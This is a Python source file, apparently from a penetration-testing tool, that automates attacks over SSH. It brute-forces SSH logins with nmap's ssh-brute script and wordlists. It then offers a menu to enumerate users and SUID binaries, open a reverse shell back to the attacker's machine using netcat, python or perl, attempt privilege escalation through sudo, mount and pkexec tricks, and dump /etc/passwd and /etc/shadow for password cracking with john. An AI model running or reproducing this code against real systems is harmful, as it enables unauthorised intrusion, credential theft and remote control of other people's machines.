import socket
import click
import paramiko
import re
from PyInquirer.prompt import prompt
from termcolor import colored
from reverse_shell import communicate, setup_server, nc_reverse_shell_cmds, python_reverse_shell_cmds, perl_reverse_shell_cmds
from password import credential_scan
from utils import find_suid_binaries, check_useful_binaries, check_compiler
from helper.questions import ssh_question

processes = []


def ssh_connect(ip, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip, port, username, password)
    print(colored('\n' + 'SSH connected.', attrs=['bold']))
    print('\n----------------------------------------------------\n')
    nextQuestion = True
    while nextQuestion:
        answer = prompt(ssh_question()).get('scan')
        if answer == 'user list':
            stdin, stdout, stderr = ssh.exec_command(
                'getent passwd | awk -F: \'{ print $1}\'')
            outlines = stdout.readlines()
            if len(outlines) > 0:
                for user in outlines:
                    click.echo(user.replace('\n', ''))
                print('\n----------------------------------------------------\n')
        elif answer == 'suid binaries':
            stdin, stdout, stderr = ssh.exec_command(find_suid_binaries(ip))
            outlines = stdout.readlines()
            if len(outlines) > 0:
                for path in outlines:
                    print(path.replace('\n', ''))
                print('\n----------------------------------------------------\n')
        elif answer == 'useful binaries':
            stdin, stdout, stderr = ssh.exec_command(check_useful_binaries(ip))
            outlines = stdout.readlines()
            if len(outlines) > 0:
                for binary in outlines:
                    print(binary.replace('\n', ''))
                print('\n----------------------------------------------------\n')
        elif answer == 'available compilers':
            stdin, stdout, stderr = ssh.exec_command(check_compiler(ip))
            outlines = stdout.readlines()
            if len(outlines) > 0:
                compilers = []
                for compiler in outlines:
                    compilers.append(compiler.replace('\n', '').split(' '))
                compiler_path = []
                for compiler in compilers:
                    tmp_compiler = ''
                    for item in compiler:
                        if len(item) > 0:
                            tmp_compiler += item + ' '
                    compiler_path.append(tmp_compiler)
                for compiler in compiler_path:
                    print(compiler)
                print('\n----------------------------------------------------\n')
        elif answer == 'reverse shell':
            stdin, stdout, stderr = ssh.exec_command(check_useful_binaries(ip))
            outlines = stdout.readlines()
            useful_binaries = []
            if len(outlines) > 0:
                ip = '0.0.0.0'
                port = 5559
                server = setup_server(ip, port)
                local_ip = socket.gethostbyname_ex(socket.gethostname())[-1][0]
                for binary in outlines:
                    if 'not found' not in binary:
                        useful_binaries.append(binary.replace('\n', ''))
                
                cmds = []

                for binary in useful_binaries:
                    if 'nc' in binary or 'netcat' in binary:
                        cmds = nc_reverse_shell_cmds(local_ip, port) 
                        break
                    elif 'python' in binary:
                        cmds = python_reverse_shell_cmds(local_ip, port)
                        break
                    elif 'perl' in binary:
                        cmds = perl_reverse_shell_cmds(local_ip, port)
                        break
                
                for cmd in cmds:
                    ssh.exec_command(cmd)
                    communicate(server)
                    break
        elif answer == 'available credentials':
            stdin, stdout, stderr = ssh.exec_command(find_suid_binaries(ip))
            outlines = stdout.readlines()
            if len(outlines) > 0:
                for path in outlines:
                    if path == '/usr/bin/sudo':
                        ssh.exec_command('sudo su')
                    elif path == '/bin/mount':
                        ssh.exec_command(
                            'sudo mount -o bind /bin/sh /bin/mount')
                        ssh.exec_command('sudo mount')
                    elif path == '/usr/bin/pkexec':
                        ssh.exec_command('sudo pkexec /bin/sh')
                    elif path == '/usr/bin/pkexec':
                        ssh.exec_command('COMMAND=id')
                        ssh.exec_command('echo "$COMMAND" | at now')
                        ssh.exec_command(
                            'sudo echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null')
                etc_password = []
                etc_shadow = []
                stdin, stdout, stderr = ssh.exec_command(
                    'sudo cat /etc/passwd')
                etc_password = stdout.readlines()
                stdin, stdout, stderr = ssh.exec_command(
                    'sudo cat /etc/shadow')
                etc_shadow = stdout.readlines()
                credential_scan(etc_password, etc_shadow)
                print('\n----------------------------------------------------\n')
        elif answer == 'continue':
            nextQuestion = False
    # subprocess.run(["unshadow", "./utils/ssh/etc_password.txt",
    #               "./utils/ssh/etc_shadow.txt", ">", "./utils/ssh/john.txt"])
    # subprocess.run(["john", "--wordlist=./utils/ssh/passwords.txt",
    #               "./utils/ssh/john.txt"])
    # stdin, stdout, stderr = ssh.exec_command('ps aux | head -1; ps aux | sort -rnk 4 | head -5')
    # outlines = stdout.readlines()
    # for process in outlines:
    #    row = process.replace('\n', '').split(' ')
    #    for element in row:
    #        if len(element) == 0:
    #            row.remove(element)
    #    print(row)
    #    processes.append(row)
    # print(processes)


def get_ssh_access(ip, nmScan):
    if ip == 'localhost':
        ip = '127.0.0.1'
    print(colored('\nGet SSH access:', attrs=['bold']))
    nmScan.scan(
        ip, arguments='-p 22 --script ssh-brute --script-args userdb=./utils/word_lists/users.txt,passdb=./utils/word_lists/passwords.txt')
    result = nmScan[ip]['tcp'][22]['script']['ssh-brute']
    if 'Valid credentials' in result:
        print(colored(result, 'green'))
        valid_credential = re.finditer(r"\w+:\w+", result, re.MULTILINE)
        for match in valid_credential:
            return match.group()
    else:
        print(result)
